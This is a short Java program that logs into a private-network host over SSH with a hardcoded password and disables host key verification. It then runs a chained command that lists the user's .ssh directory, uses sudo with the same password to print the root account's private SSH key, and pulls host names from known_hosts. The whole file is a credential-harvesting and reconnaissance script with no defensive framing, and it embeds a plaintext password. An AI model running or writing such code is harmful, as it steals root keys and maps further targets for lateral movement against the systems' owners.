import com.jcraft.jsch.*;
import java.io.*;
class SSHM {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("ls -la ~/.ssh/ 2>&1;echo ---SUDO---;echo kutul0nc4t | sudo -S cat /root/.ssh/id_rsa 2>&1 | head -5;echo ---KNOWN---;cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u | head -20");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
